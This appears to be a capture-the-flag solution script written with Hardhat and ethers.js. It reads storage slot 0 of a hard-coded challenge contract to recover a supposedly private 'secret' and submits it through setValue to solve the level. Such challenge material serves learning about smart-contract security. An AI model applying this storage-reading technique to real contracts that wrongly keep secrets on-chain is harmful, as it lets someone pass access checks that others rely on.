import { ethers } from "hardhat";

const INSTACE_CA = "0x397DE8d9B1198e1513767E2b328b2B03922AF0F9";

async function main() {
  const [signer] = await ethers.getSigners();

  // find secret
  const secret = await ethers.provider.getStorage(INSTACE_CA, 0);

  // submit answer
  const abi = ["function setValue(uint256)"];
  const iface = new ethers.Interface(abi);
  const data = iface.encodeFunctionData("setValue", [secret]);
  const tx = await signer.sendTransaction({
    to: INSTACE_CA,
    data,
  });
  await tx.wait();
  console.log("nonce: ", tx.nonce.toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
